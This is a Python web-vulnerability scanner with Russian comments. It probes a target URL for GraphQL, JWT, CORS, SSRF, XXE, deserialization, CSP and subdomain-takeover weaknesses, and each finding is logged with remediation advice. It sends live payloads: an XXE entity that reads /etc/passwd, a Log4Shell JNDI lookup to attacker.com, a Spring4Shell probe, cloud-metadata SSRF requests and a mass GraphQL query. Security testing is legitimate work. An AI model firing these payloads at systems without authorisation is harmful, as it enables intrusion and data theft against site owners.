#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import re
import ssl
import socket
import subprocess
import logging
import os
import time
import threading
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("advanced_vulnerability_tools.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AdvancedVulnerabilityTools")

class AdvancedWebSecurityTools:
    """
    Расширенные инструменты для тестирования безопасности веб-приложений.
    Включает современные техники проверки уязвимостей и обхода защиты.
    """
    
    def __init__(self, target_url, output_dir="security_reports"):
        self.target_url = self._validate_url(target_url)
        self.output_dir = output_dir
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        os.makedirs(output_dir, exist_ok=True)
        self.results = {
            "target": target_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "vulnerabilities": []
        }
        
    def _validate_url(self, url):
        """Проверка и нормализация URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url
        
    def log_vulnerability(self, vuln_type, severity, details, evidence=None, remediation=None):
        """Добавление найденной уязвимости в отчет"""
        vulnerability = {
            "type": vuln_type,
            "severity": severity,
            "details": details,
            "evidence": evidence,
            "remediation": remediation
        }
        self.results["vulnerabilities"].append(vulnerability)
        logger.info(f"Detected {severity} {vuln_type}: {details}")
        
    def save_results(self):
        """Сохранение результатов в JSON файл"""
        output_file = os.path.join(self.output_dir, f"advanced_scan_{int(time.time())}.json")
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=4)
        logger.info(f"Results saved to {output_file}")
        return output_file
    
    # ======== Современные методы сканирования уязвимостей ========
    
    def check_graphql_vulnerabilities(self):
        """Проверка уязвимостей в GraphQL API"""
        logger.info("Checking for GraphQL vulnerabilities...")
        
        # Общие пути к GraphQL эндпоинтам
        graphql_paths = [
            "/graphql", "/api/graphql", "/v1/graphql", 
            "/graphiql", "/graphql.php", "/graphql/console"
        ]
        
        introspection_query = {
            "query": """
            {
              __schema {
                types {
                  name
                  fields {
                    name
                  }
                }
              }
            }
            """
        }
        
        for path in graphql_paths:
            endpoint = urljoin(self.target_url, path)
            try:
                response = requests.post(
                    endpoint, 
                    json=introspection_query,
                    headers=self.headers,
                    timeout=10
                )
                
                if response.status_code == 200 and "__schema" in response.text:
                    self.log_vulnerability(
                        "GraphQL Introspection Enabled", 
                        "Medium", 
                        f"GraphQL introspection is enabled at {endpoint}, allowing schema discovery",
                        evidence=response.text[:500],
                        remediation="Disable GraphQL introspection in production environments"
                    )
                    
                    # Проверка на возможность выполнения произвольных запросов
                    # Добавление попытки чтения системной информации
                    dos_query = {
                        "query": """
                        query {
                          users(first: 9999999) {
                            nodes {
                              id
                              name
                              email
                            }
                          }
                        }
                        """
                    }
                    
                    dos_response = requests.post(
                        endpoint, 
                        json=dos_query,
                        headers=self.headers,
                        timeout=5
                    )
                    
                    if dos_response.status_code == 200 and ("users" in dos_response.text or "nodes" in dos_response.text):
                        self.log_vulnerability(
                            "GraphQL Resource Exhaustion", 
                            "High", 
                            f"GraphQL API at {endpoint} may be vulnerable to resource exhaustion (DoS) attacks",
                            evidence=dos_response.text[:500],
                            remediation="Implement query depth limitation, query complexity analysis and rate limiting"
                        )
                        
            except requests.exceptions.RequestException as e:
                logger.debug(f"Error checking {endpoint}: {str(e)}")
                continue
                
        return len(self.results["vulnerabilities"]) > 0
    
    def check_jwt_vulnerabilities(self):
        """Проверка уязвимостей в JWT токенах"""
        logger.info("Checking for JWT vulnerabilities...")
        
        # Попытка получить JWT токен (анализ куки, заголовков и ответов)
        try:
            # Часто JWT можно найти в куки при авторизации
            response = requests.get(self.target_url, headers=self.headers, timeout=10)
            cookies = response.cookies
            
            jwt_tokens = []
            
            # Проверка куки на JWT
            for cookie in cookies:
                if self._looks_like_jwt(cookie.value):
                    jwt_tokens.append(("cookie", cookie.name, cookie.value))
            
            # Проверка заголовков на JWT
            for header, value in response.headers.items():
                if self._looks_like_jwt(value):
                    jwt_tokens.append(("header", header, value))
                    
            # Проверка на JWT токены в ответе
            jwt_pattern = re.compile(r'eyJ[a-zA-Z0-9_-]{5,}\.eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}')
            for match in jwt_pattern.finditer(response.text):
                jwt_tokens.append(("response", "body", match.group(0)))
                
            # Анализ найденных JWT токенов
            for location, name, token in jwt_tokens:
                # Проверка на алгоритм None
                parts = token.split('.')
                if len(parts) != 3:
                    continue
                    
                try:
                    header_data = json.loads(self._base64url_decode(parts[0]))
                    
                    # Проверка на использование слабых алгоритмов
                    if "alg" in header_data:
                        alg = header_data["alg"]
                        
                        if alg.lower() == "none":
                            self.log_vulnerability(
                                "JWT Algorithm None", 
                                "Critical", 
                                f"JWT token in {location} '{name}' uses 'none' algorithm which is vulnerable to signature bypass",
                                evidence=f"Token: {token[:20]}..., Header: {json.dumps(header_data)}",
                                remediation="Ensure JWT tokens always use strong algorithms like RS256 or ES256"
                            )
                        
                        if alg.lower() in ["hs256", "hs384", "hs512"]:
                            self.log_vulnerability(
                                "JWT Uses Symmetric Algorithm", 
                                "Medium", 
                                f"JWT token in {location} '{name}' uses symmetric algorithm {alg} which may be vulnerable if weak keys are used",
                                evidence=f"Token: {token[:20]}..., Algorithm: {alg}",
                                remediation="Consider using asymmetric algorithms (RS*, ES*) if possible, and ensure strong keys"
                            )
                    
                    # Проверка на хранение чувствительных данных
                    payload_data = json.loads(self._base64url_decode(parts[1]))
                    sensitive_fields = ["password", "secret", "key", "token", "credit_card", "ssn", "social_security"]
                    
                    for field in sensitive_fields:
                        if any(field in key.lower() for key in payload_data.keys()):
                            self.log_vulnerability(
                                "JWT Contains Sensitive Data", 
                                "High", 
                                f"JWT token contains potentially sensitive data in field names",
                                evidence=f"Token with sensitive fields: {json.dumps(payload_data.keys())}",
                                remediation="Never store sensitive information in JWT tokens as they are easily decoded"
                            )
                            break
                            
                except Exception as e:
                    logger.debug(f"Error analyzing JWT token: {str(e)}")
                    
        except requests.exceptions.RequestException as e:
            logger.debug(f"Error checking JWT: {str(e)}")
            
        return len(self.results["vulnerabilities"]) > 0
        
    def _looks_like_jwt(self, value):
        """Проверка, похоже ли значение на JWT токен"""
        if not isinstance(value, str):
            return False
        
        jwt_pattern = re.compile(r'^eyJ[a-zA-Z0-9_-]{5,}\.eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}$')
        return bool(jwt_pattern.match(value))
        
    def _base64url_decode(self, input):
        """Декодирование base64url-encoded в JWT"""
        padded = input + "=" * (4 - len(input) % 4)
        padded = padded.replace("-", "+").replace("_", "/")
        import base64
        return base64.b64decode(padded).decode("utf-8")
    
    def check_cors_misconfiguration(self):
        """Проверка неправильной настройки CORS"""
        logger.info("Checking for CORS misconfigurations...")
        
        try:
            # Проверка с произвольным Origin
            malicious_origins = [
                "https://evil.com",
                "https://attacker.com",
                "null",
                self.target_url + ".evil.com",
                self.target_url.replace("https://", "https://evil-")
            ]
            
            for origin in malicious_origins:
                headers = self.headers.copy()
                headers["Origin"] = origin
                
                response = requests.get(self.target_url, headers=headers, timeout=10)
                
                if "Access-Control-Allow-Origin" in response.headers:
                    acao = response.headers["Access-Control-Allow-Origin"]
                    
                    if acao == "*":
                        self.log_vulnerability(
                            "CORS Misconfiguration", 
                            "Medium", 
                            "CORS wildcard policy (Access-Control-Allow-Origin: *) allows any domain to access resources",
                            evidence=f"Origin: {origin}, Response: Access-Control-Allow-Origin: *",
                            remediation="Specify allowed domains explicitly instead of using wildcard (*)"
                        )
                        
                    elif acao == origin and "Access-Control-Allow-Credentials" in response.headers and response.headers["Access-Control-Allow-Credentials"].lower() == "true":
                        self.log_vulnerability(
                            "CORS Misconfiguration", 
                            "High", 
                            f"CORS policy reflects arbitrary origin ({origin}) and allows credentials, enabling cross-domain attacks",
                            evidence=f"Origin: {origin}, Response: Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: true",
                            remediation="Do not reflect arbitrary origins in CORS headers and avoid allowing credentials with wildcard origins"
                        )
                        
                    elif acao == origin:
                        self.log_vulnerability(
                            "CORS Misconfiguration", 
                            "Medium", 
                            f"CORS policy reflects arbitrary origin ({origin}), potentially enabling cross-domain attacks",
                            evidence=f"Origin: {origin}, Response: Access-Control-Allow-Origin: {acao}",
                            remediation="Implement strict validation of allowed origins"
                        )
                        
        except requests.exceptions.RequestException as e:
            logger.debug(f"Error checking CORS: {str(e)}")
            
        return len(self.results["vulnerabilities"]) > 0
    
    def check_api_vulnerabilities(self):
        """Проверка уязвимостей в REST API"""
        logger.info("Checking for API vulnerabilities...")
        
        # Распространенные пути к API
        api_paths = [
            "/api", "/v1", "/v2", "/rest", "/api/v1", 
            "/api/v2", "/api/users", "/api/data", 
            "/graphql", "/swagger", "/api-docs"
        ]
        
        for path in api_paths:
            endpoint = urljoin(self.target_url, path)
            try:
                response = requests.get(endpoint, headers=self.headers, timeout=10)
                
                # Проверка на документацию API
                if response.status_code == 200:
                    # Проверка на Swagger/OpenAPI
                    if any(x in response.text.lower() for x in ["swagger", "openapi", "api-docs", "apispec"]):
                        self.log_vulnerability(
                            "API Documentation Exposed", 
                            "Medium", 
                            f"API documentation exposed at {endpoint}",
                            evidence=response.text[:500],
                            remediation="Restrict access to API documentation in production environments"
                        )
                        
                    # Проверка на JSON структуру
                    try:
                        if response.headers.get('Content-Type', '').lower().find('json') >= 0:
                            data = response.json()
                            
                            # Проверка на утечку данных
                            if isinstance(data, list) and len(data) > 5:
                                self.log_vulnerability(
                                    "API Data Exposure", 
                                    "Medium", 
                                    f"API at {endpoint} may expose sensitive data collections",
                                    evidence=str(data)[:500],
                                    remediation="Implement proper authentication and authorization for API endpoints"
                                )
                                
                            # Проверка на ключи API в ответе
                            if isinstance(data, dict):
                                sensitive_keys = ["api_key", "key", "token", "secret", "password", "credential"]
                                for key in data.keys():
                                    if any(sensitive in key.lower() for sensitive in sensitive_keys):
                                        self.log_vulnerability(
                                            "API Key Exposure", 
                                            "High", 
                                            f"API at {endpoint} exposes sensitive key: {key}",
                                            evidence=f"Sensitive key found: {key}",
                                            remediation="Never expose API keys, tokens or credentials in API responses"
                                        )
                    except json.JSONDecodeError:
                        pass
                        
                # Проверка методов HTTP
                if "Allow" in response.headers:
                    allow_methods = response.headers["Allow"].split(", ")
                    dangerous_methods = ["PUT", "DELETE", "PATCH"]
                    for method in allow_methods:
                        if method in dangerous_methods:
                            self.log_vulnerability(
                                "Dangerous HTTP Methods", 
                                "Medium", 
                                f"API at {endpoint} allows potentially dangerous HTTP method: {method}",
                                evidence=f"Allowed methods: {response.headers['Allow']}",
                                remediation="Restrict HTTP methods to only those needed for functionality, and ensure proper authorization"
                            )
                
                # Проверка на массовое присвоение (IDOR)
                if response.status_code == 200 and "id" in response.text.lower():
                    try:
                        id_response = requests.get(f"{endpoint}/1", headers=self.headers, timeout=5)
                        modified_response = requests.get(f"{endpoint}/2", headers=self.headers, timeout=5)
                        
                        if id_response.status_code == 200 and modified_response.status_code == 200:
                            if id_response.text != modified_response.text:
                                self.log_vulnerability(
                                    "Insecure Direct Object Reference (IDOR)", 
                                    "High", 
                                    f"API at {endpoint} may be vulnerable to IDOR, allowing access to other users' data",
                                    evidence="Different responses returned for different IDs without authentication",
                                    remediation="Implement proper access control and validate user permissions for each request"
                                )
                    except requests.exceptions.RequestException:
                        pass
                    
            except requests.exceptions.RequestException:
                continue
                
        return len(self.results["vulnerabilities"]) > 0
    
    def check_wordpress_vulnerabilities(self):
        """Проверка уязвимостей в WordPress"""
        logger.info("Checking for WordPress vulnerabilities...")
        
        # Проверка наличия WordPress
        wp_paths = ["/wp-login.php", "/wp-admin/", "/wp-content/"]
        is_wordpress = False
        
        for path in wp_paths:
            endpoint = urljoin(self.target_url, path)
            try:
                response = requests.get(endpoint, headers=self.headers, timeout=10)
                if response.status_code == 200 or response.status_code == 302:
                    is_wordpress = True
                    break
            except requests.exceptions.RequestException:
                continue
                
        if not is_wordpress:
            logger.info("WordPress not detected, skipping WordPress vulnerability checks")
            return False
            
        # Теперь проверим известные уязвимости WordPress
        wp_vulnerabilities = []
        
        # Проверка API пользователей
        try:
            users_endpoint = urljoin(self.target_url, "/wp-json/wp/v2/users")
            response = requests.get(users_endpoint, headers=self.headers, timeout=10)
            
            if response.status_code == 200:
                try:
                    users_data = response.json()
                    if isinstance(users_data, list) and len(users_data) > 0:
                        user_details = []
                        for user in users_data:
                            if "name" in user and "slug" in user:
                                user_details.append(f"{user['name']} ({user['slug']})")
                                
                        self.log_vulnerability(
                            "WordPress User Enumeration", 
                            "Medium", 
                            f"WordPress API allows user enumeration, exposing {len(users_data)} users",
                            evidence=f"Users found: {', '.join(user_details[:5])}",
                            remediation="Restrict access to the WordPress REST API using plugins or web server configuration"
                        )
                except json.JSONDecodeError:
                    pass
        except requests.exceptions.RequestException:
            pass
            
        # Проверка версии WordPress
        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Ищем версию WordPress в мета-тегах или питьевой воде
            version_meta = soup.find('meta', {'name': 'generator'})
            if version_meta and 'wordpress' in version_meta.get('content', '').lower():
                version_text = version_meta.get('content')
                match = re.search(r'WordPress\s+(\d+\.\d+(?:\.\d+)?)', version_text)
                if match:
                    version = match.group(1)
                    self.log_vulnerability(
                        "WordPress Version Disclosure", 
                        "Low", 
                        f"WordPress version ({version}) is exposed, which helps attackers identify vulnerabilities",
                        evidence=f"Meta generator tag: {version_text}",
                        remediation="Remove WordPress version information by editing theme's functions.php or using security plugins"
                    )
                    
            # Проверка README и license файлов
            license_path = urljoin(self.target_url, "/license.txt")
            readme_path = urljoin(self.target_url, "/readme.html")
            
            for path in [license_path, readme_path]:
                try:
                    doc_response = requests.get(path, headers=self.headers, timeout=5)
                    if doc_response.status_code == 200:
                        self.log_vulnerability(
                            "WordPress Information Disclosure", 
                            "Low", 
                            f"WordPress {os.path.basename(path)} file is accessible, potentially revealing version information",
                            evidence=f"{path} is accessible",
                            remediation="Remove or restrict access to WordPress information files"
                        )
                except requests.exceptions.RequestException:
                    pass
                    
            # Проверка директории плагинов
            plugins_path = urljoin(self.target_url, "/wp-content/plugins/")
            try:
                plugins_response = requests.get(plugins_path, headers=self.headers, timeout=10)
                if plugins_response.status_code == 200 and "Index of" in plugins_response.text:
                    self.log_vulnerability(
                        "WordPress Directory Listing", 
                        "Medium", 
                        "WordPress plugins directory has directory listing enabled, exposing plugin information",
                        evidence=f"{plugins_path} shows directory listing",
                        remediation="Disable directory listing in web server configuration"
                    )
            except requests.exceptions.RequestException:
                pass
                
        except requests.exceptions.RequestException:
            pass
            
        return len(self.results["vulnerabilities"]) > 0
        
    def check_ssrf_vulnerabilities(self):
        """Проверка уязвимостей типа Server-Side Request Forgery (SSRF)"""
        logger.info("Checking for SSRF vulnerabilities...")
        
        # Получение форм с сайта
        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Ищем параметры, которые могут быть уязвимы к SSRF
            potential_params = []
            
            # Проверка форм
            for form in soup.find_all('form'):
                for input_field in form.find_all('input'):
                    name = input_field.get('name', '')
                    if name and any(param in name.lower() for param in ["url", "uri", "link", "path", "dest", "redirect", "return", "site", "html", "data", "page", "feed", "host", "port", "file"]):
                        action = form.get('action', '')
                        method = form.get('method', 'get').lower()
                        potential_params.append((name, action, method))
            
            # Проверка на уязвимость SSRF
            ssrf_test_endpoints = [
                "http://127.0.0.1/",
                "http://localhost/",
                "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                "http://0.0.0.0/",
                "http://[::1]/",
                "http://internal-service/"
            ]
            
            # Проверка для каждого потенциально уязвимого параметра
            for param_name, action_url, method in potential_params:
                target_url = urljoin(self.target_url, action_url) if action_url else self.target_url
                
                for ssrf_endpoint in ssrf_test_endpoints:
                    try:
                        if method == 'post':
                            response = requests.post(
                                target_url, 
                                data={param_name: ssrf_endpoint},
                                headers=self.headers,
                                timeout=5
                            )
                        else:
                            response = requests.get(
                                target_url, 
                                params={param_name: ssrf_endpoint},
                                headers=self.headers,
                                timeout=5
                            )
                            
                        # Проверка индикаторов успешного SSRF
                        ssrf_indicators = [
                            "internal server error",
                            "private address",
                            "metadata",
                            "ami-",
                            "instance-id",
                            "no route to host",
                            "connection refused",
                            "network is unreachable",
                            "could not resolve host"
                        ]
                        
                        if any(indicator in response.text.lower() for indicator in ssrf_indicators):
                            self.log_vulnerability(
                                "Server-Side Request Forgery (SSRF)", 
                                "Critical", 
                                f"Potential SSRF vulnerability in {param_name} parameter",
                                evidence=f"Parameter: {param_name}, Method: {method.upper()}, URL: {target_url}, Test: {ssrf_endpoint}",
                                remediation="Validate and sanitize all URL parameters, implement whitelisting, use network segmentation"
                            )
                            break
                    except requests.exceptions.RequestException:
                        continue
                        
        except requests.exceptions.RequestException as e:
            logger.debug(f"Error checking SSRF: {str(e)}")
            
        return len(self.results["vulnerabilities"]) > 0
    
    def check_xxe_vulnerabilities(self):
        """Проверка уязвимостей XXE (XML External Entity)"""
        logger.info("Checking for XXE vulnerabilities...")
        
        # Ищем потенциальные эндпоинты, принимающие XML
        potential_xml_endpoints = [
            "/api/xml", "/upload", "/import", "/soap", "/api/data", 
            "/rpc", "/service", "/api/service", "/api/import"
        ]
        
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""
        
        xxe_windows_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>"""
        
        for path in potential_xml_endpoints:
            endpoint = urljoin(self.target_url, path)
            
            # Проверка с различными заголовками Content-Type для XML
            content_types = [
                "application/xml",
                "text/xml",
                "application/soap+xml"
            ]
            
            for content_type in content_types:
                try:
                    headers = self.headers.copy()
                    headers["Content-Type"] = content_type
                    
                    # Проверка Unix paylaod
                    response = requests.post(
                        endpoint,
                        data=xxe_payload,
                        headers=headers,
                        timeout=10
                    )
                    
                    # Проверка на наличие содержимого файла /etc/passwd
                    if "root:" in response.text or "nobody:" in response.text:
                        self.log_vulnerability(
                            "XML External Entity (XXE)", 
                            "Critical", 
                            f"XXE vulnerability detected at {endpoint}",
                            evidence=f"Content-Type: {content_type}, Endpoint: {endpoint}, Response contains /etc/passwd contents",
                            remediation="Disable external entity processing in XML parsers and use less complex data formats like JSON if possible"
                        )
                        break
                        
                    # Проверка Windows payload
                    response = requests.post(
                        endpoint,
                        data=xxe_windows_payload,
                        headers=headers,
                        timeout=10
                    )
                    
                    # Проверка на наличие содержимого файла win.ini
                    if "for 16-bit app support" in response.text:
                        self.log_vulnerability(
                            "XML External Entity (XXE)", 
                            "Critical", 
                            f"XXE vulnerability detected at {endpoint}",
                            evidence=f"Content-Type: {content_type}, Endpoint: {endpoint}, Response contains Windows win.ini contents",
                            remediation="Disable external entity processing in XML parsers and use less complex data formats like JSON if possible"
                        )
                        break
                        
                except requests.exceptions.RequestException:
                    continue
                    
        return len(self.results["vulnerabilities"]) > 0
    
    def check_insecure_deserialization(self):
        """Проверка уязвимости небезопасной десериализации"""
        logger.info("Checking for insecure deserialization vulnerabilities...")
        
        # Ищем потенциальные эндпоинты, принимающие сериализованные данные
        potential_endpoints = [
            "/api/data", "/import", "/upload", "/object", 
            "/serialize", "/deserialize", "/transfer"
        ]
        
        # Полезные нагрузки для различных языков
        php_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}'
        java_payload = '\xac\xed\x00\x05\x73\x72\x00\x0e\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x03\x00\x00\x70\x74\x00\x04\x74\x65\x73\x74'
        python_payload = '\x80\x03X\x04\x00\x00\x00testq\x00.'
        
        for path in potential_endpoints:
            endpoint = urljoin(self.target_url, path)
            
            # Проверка с различными заголовками Content-Type
            content_types = [
                "application/x-php-serialized", 
                "application/x-java-serialized-object",
                "application/python-pickle",
                "application/octet-stream"
            ]
            
            for i, content_type in enumerate(content_types):
                try:
                    headers = self.headers.copy()
                    headers["Content-Type"] = content_type
                    
                    # Выбор соответствующей полезной нагрузки
                    if i == 0:  # PHP
                        payload = php_payload
                    elif i == 1:  # Java
                        payload = java_payload
                    elif i == 2:  # Python
                        payload = python_payload
                    else:
                        continue
                    
                    # Отправка запроса
                    response = requests.post(
                        endpoint,
                        data=payload,
                        headers=headers,
                        timeout=10
                    )
                    
                    # Проверка на характерные ошибки десериализации
                    error_indicators = [
                        "unserialize(", "deserialize", "readObject", 
                        "ClassNotFoundException", "ObjectInputStream",
                        "pickle", "unmarshall", "Unexpected token",
                        "__php_incomplete_class", "cannot be unserialized"
                    ]
                    
                    if any(indicator in response.text for indicator in error_indicators) and response.status_code >= 500:
                        self.log_vulnerability(
                            "Insecure Deserialization", 
                            "Critical", 
                            f"Potential insecure deserialization at {endpoint}",
                            evidence=f"Content-Type: {content_type}, Response contains deserialization error indicators",
                            remediation="Never accept serialized objects from untrusted sources. Use JSON with schema validation instead."
                        )
                        break
                        
                except requests.exceptions.RequestException:
                    continue
                    
        return len(self.results["vulnerabilities"]) > 0
        
    def check_csp_vulnerabilities(self):
        """Проверка уязвимостей в Content Security Policy (CSP)"""
        logger.info("Checking for CSP vulnerabilities...")
        
        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10)
            
            # Проверка наличия CSP
            csp_header = None
            for header in ["Content-Security-Policy", "X-Content-Security-Policy", "X-WebKit-CSP"]:
                if header in response.headers:
                    csp_header = response.headers[header]
                    break
                    
            if not csp_header:
                self.log_vulnerability(
                    "Missing Content Security Policy", 
                    "Medium", 
                    "Content Security Policy (CSP) header is not set",
                    remediation="Implement a strict Content Security Policy to prevent XSS and data injection attacks"
                )
                return True
                
            # Анализ CSP
            dangerous_directives = []
            
            # Проверка unsafe-inline
            if "unsafe-inline" in csp_header:
                dangerous_directives.append("'unsafe-inline' allows inline scripts and styles, negating XSS protections")
                
            # Проверка unsafe-eval
            if "unsafe-eval" in csp_header:
                dangerous_directives.append("'unsafe-eval' allows the use of eval(), compromising XSS protections")
                
            # Проверка wildcard источников
            if "script-src *" in csp_header or "default-src *" in csp_header:
                dangerous_directives.append("Wildcard (*) in script-src or default-src allows scripts from any domain")
                
            # Проверка data: URLs
            if "data:" in csp_header:
                dangerous_directives.append("data: URIs are allowed and can be used to bypass CSP")
                
            if dangerous_directives:
                self.log_vulnerability(
                    "Weak Content Security Policy", 
                    "Medium", 
                    "Content Security Policy contains potentially dangerous directives",
                    evidence=f"CSP: {csp_header}\nIssues: {', '.join(dangerous_directives)}",
                    remediation="Remove unsafe directives and wildcards from CSP. Use specific origins instead."
                )
                
        except requests.exceptions.RequestException as e:
            logger.debug(f"Error checking CSP: {str(e)}")
            
        return len(self.results["vulnerabilities"]) > 0
    
    def check_subdomain_takeover(self):
        """Проверка возможности перехвата поддоменов"""
        logger.info("Checking for subdomain takeover vulnerabilities...")
        
        # Разбор основного домена
        parsed_url = urlparse(self.target_url)
        main_domain = parsed_url.netloc
        
        # Попытка получить поддомены из DNS
        try:
            subdomains = self._get_subdomains(main_domain)
            
            # Проверка каждого поддомена на уязвимость перехвата
            for subdomain in subdomains:
                try:
                    subdomain_url = f"https://{subdomain}"
                    response = requests.get(subdomain_url, headers=self.headers, timeout=10, allow_redirects=True)
                    
                    # Признаки уязвимости перехвата поддомена
                    takeover_signs = [
                        "No such app", "No such bucket", "No such service",
                        "No Such Account", "NoSuchBucket", "is not a registered",
                        "Trying to access your account?", "404 Not Found",
                        "Page not found", "The specified bucket does not exist"
                    ]
                    
                    if any(sign in response.text for sign in takeover_signs):
                        self.log_vulnerability(
                            "Potential Subdomain Takeover", 
                            "High", 
                            f"Subdomain {subdomain} may be vulnerable to takeover",
                            evidence=f"Subdomain: {subdomain}, Response contains signs of unclaimed services",
                            remediation="Remove DNS entries for unused subdomains or claim the third-party service"
                        )
                        
                except requests.exceptions.RequestException:
                    # Проверка на CNAME без соответствующего сервиса
                    try:
                        import dns.resolver
                        answers = dns.resolver.resolve(subdomain, 'CNAME')
                        
                        for answer in answers:
                            cname = answer.target.to_text().rstrip('.')
                            
                            # Проверка на известные сервисы, которые могут быть уязвимы
                            vulnerable_services = [
                                "amazonaws.com", "azure-api.net", "cloudfront.net",
                                "github.io", "herokuapp.com", "netlify.app"
                            ]
                            
                            if any(service in cname for service in vulnerable_services):
                                try:
                                    # Попытка доступа к CNAME
                                    cname_response = requests.get(f"https://{cname}", headers=self.headers, timeout=5)
                                    
                                    if cname_response.status_code >= 400:
                                        self.log_vulnerability(
                                            "Potential Subdomain Takeover via CNAME", 
                                            "High", 
                                            f"Subdomain {subdomain} points to non-existent {cname} via CNAME",
                                            evidence=f"Subdomain: {subdomain}, CNAME: {cname}",
                                            remediation="Claim the service at the CNAME or remove the DNS entry"
                                        )
                                except requests.exceptions.RequestException:
                                    pass
                    except:
                        pass
                        
        except Exception as e:
            logger.debug(f"Error during subdomain takeover check: {str(e)}")
            
        return len(self.results["vulnerabilities"]) > 0
        
    def _get_subdomains(self, domain):
        """Получение поддоменов для домена (упрощенный метод)"""
        # В полной реализации здесь должны использоваться внешние API или инструменты
        # Возвращаем базовый поддомен для демонстрации
        return [f"www.{domain}", f"api.{domain}", f"mail.{domain}", f"dev.{domain}", f"test.{domain}"]
    
    def check_nuclei_top_cves(self):
        """Проверка на наличие уязвимостей из топа CVE с помощью nuclei"""
        logger.info("Checking for top CVEs with nuclei patterns...")
        
        # Это эмуляция работы Nuclei, в реальности нужно установить и запустить инструмент
        # Краткие паттерны для проверки критических уязвимостей
        cve_patterns = [
            {
                "id": "CVE-2021-44228",  # Log4j
                "paths": ["/?x=${jndi:ldap://attacker.com/a}"],
                "indicators": ["JNDI cannot be resolved", "Reference Class Name"],
                "severity": "Critical",
                "name": "Apache Log4j RCE (Log4Shell)"
            },
            {
                "id": "CVE-2021-26084",  # Confluence
                "paths": ["/pages/createpage-entervariables.action"],
                "indicators": ["atlassian", "confluence"],
                "severity": "Critical",
                "name": "Atlassian Confluence OGNL Injection"
            },
            {
                "id": "CVE-2022-22965",  # Spring4Shell
                "paths": ["/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"],
                "indicators": ["ClassLoader", "java.lang"],
                "severity": "Critical",
                "name": "Spring4Shell RCE"
            }
        ]
        
        for cve in cve_patterns:
            for path in cve["paths"]:
                try:
                    url = urljoin(self.target_url, path)
                    response = requests.get(url, headers=self.headers, timeout=10)
                    
                    # Проверка индикаторов уязвимости
                    for indicator in cve["indicators"]:
                        if indicator.lower() in response.text.lower():
                            self.log_vulnerability(
                                f"Potential {cve['name']} ({cve['id']})", 
                                cve["severity"], 
                                f"The application may be vulnerable to {cve['name']}",
                                evidence=f"URL: {url}, Response contains indicator: {indicator}",
                                remediation="Update the affected component to the latest version with security patches"
                            )
                            break
                except requests.exceptions.RequestException:
                    continue
                    
        return len(self.results["vulnerabilities"]) > 0
    
    def run_all_checks(self):
        """Запуск всех проверок безопасности"""
        logger.info(f"Starting comprehensive security check for {self.target_url}")
        
        checks = [
            self.check_graphql_vulnerabilities,
            self.check_jwt_vulnerabilities,
            self.check_cors_misconfiguration,
            self.check_api_vulnerabilities,
            self.check_wordpress_vulnerabilities,
            self.check_ssrf_vulnerabilities,
            self.check_xxe_vulnerabilities,
            self.check_insecure_deserialization,
            self.check_csp_vulnerabilities,
            self.check_subdomain_takeover,
            self.check_nuclei_top_cves
        ]
        
        for check in checks:
            try:
                check()
            except Exception as e:
                logger.error(f"Error running {check.__name__}: {str(e)}")
                
        # Сохранение результатов
        report_path = self.save_results()
        logger.info(f"Security check completed. Found {len(self.results['vulnerabilities'])} potential vulnerabilities.")
        
        return self.results, report_path

def main():
    """Функция для запуска сканера из командной строки"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Advanced Web Security Scanner")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--output", "-o", default="security_reports", help="Output directory")
    
    args = parser.parse_args()
    
    scanner = AdvancedWebSecurityTools(args.url, args.output)
    results, report_path = scanner.run_all_checks()
    
    print(f"\nScan completed. Report saved to: {report_path}")
    print(f"Found {len(results['vulnerabilities'])} potential vulnerabilities")
    
if __name__ == "__main__":
    main() 